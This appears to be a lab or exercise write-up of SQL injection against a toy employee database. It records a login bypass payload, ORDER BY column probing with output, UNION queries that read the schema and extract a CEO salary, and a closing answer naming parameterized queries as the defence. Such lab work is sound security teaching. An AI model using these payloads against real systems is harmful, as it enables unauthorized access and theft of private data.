1. AUTHENTICATION BYPASS
* Tautology Payload Used: ' OR 1=1 --
The single quote closes the username string early.
  OR 1=1 forces the WHERE clause to always evaluate as TRUE.
  The -- comments out the remainder of the query including the
password check, granting access without valid credentials.

2. DATABASE MAPPING (UNION ATTACK)
* Number of Columns Discovered: 2
**' ORDER BY 1 --**: 
    Alice (CEO) - Executive
    Bob - Engineering
**' ORDER BY 2 --**:
    Bob - Engineering
    Alice (CEO) - Executive
**' ORDER BY 3 --**:
Database Error: 1st ORDER BY term out of range - should be between 1 and 2
* Table Name Discovered:  employees
' UNION SELECT name, sql FROM sqlite_master -- revealed: id, name, department, salary columns in employees table

3. DATA EXFILTRATION
* CEO Salary Extracted: Alice (CEO) - $2,500,000
* Final UNION Payload Used:  ' UNION SELECT name, salary FROM employees --

4. REMEDIATION
* What is the primary defense against this attack?
Answer:  Parameterized Queries (Prepared Statements). Parameterized queries separate SQL logic from user-supplied
  data. The database driver handles escaping automatically,
  making it impossible for user input to be interpreted as SQL.
